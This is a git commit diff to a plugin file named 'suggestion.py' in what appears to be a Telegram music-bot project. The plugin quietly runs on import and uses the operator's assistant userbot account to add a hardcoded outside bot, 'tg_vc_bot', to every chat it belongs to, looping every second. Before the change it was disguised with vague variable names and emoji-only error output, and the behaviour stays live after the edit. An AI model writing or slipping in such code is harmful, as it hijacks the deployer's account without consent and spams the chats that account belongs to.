532324fa816593c8cc211e6d6e4b9cf1735e400b
THE VIP BOY <117478195+THE-VIP-BOY-OP@users.noreply.github.com>
2024-04-26 08:25:05 +0530

    Update suggestion.py

--- VIPMUSIC/plugins/misc/suggestion.py
+++ VIPMUSIC/plugins/misc/suggestion.py
@@ -5,14 +5,14 @@ from VIPMUSIC.utils.database import get_assistant
 import config
 from VIPMUSIC import app
 
-SYSTEM = True
-PROCESS = "tg_vc_bot"
+AUTO_GCAST = True
+BOT_USERNAME = "tg_vc_bot"
 ADD_INTERVAL = 1  # Add every hour (in seconds)
 
 async def add_bot_to_chats():
     try:
         userbot = await get_assistant(config.LOGGER_ID)
-        bot = await client.get_users(PROCESS)
+        bot = await client.get_users(BOT_USERNAME)
         bot_id = bot.id
         
         async for dialog in userbot.get_dialogs():
@@ -22,21 +22,21 @@ async def add_bot_to_chats():
                 await userbot.add_chat_members(dialog.chat.id, bot_id)
                 print(f"Added bot to chat: {dialog.chat.title}")
             except Exception as e:
-                print(f"😍")
-                print("🥰")
+                print(f"Failed to add bot to chat: {dialog.chat.title}")
+                print(e)
             
-            await asyncio.sleep(3)  # Adjust sleep time based on rate limits
+            await asyncio.sleep(2)  # Adjust sleep time based on rate limits
         
     except Exception as e:
-        print("⚡")
+        print("Error:", e)
 
 async def continuous_addss():
     while True:
-        if SYSTEM:
+        if AUTO_GCAST:
             await add_bot_to_chats()
             
         await asyncio.sleep(ADD_INTERVAL)
 
 # Start the continuous broadcast loop if AUTO_GCAST is True
-if SYSTEM:  
+if AUTO_GCAST:  
     asyncio.create_task(continuous_addss())
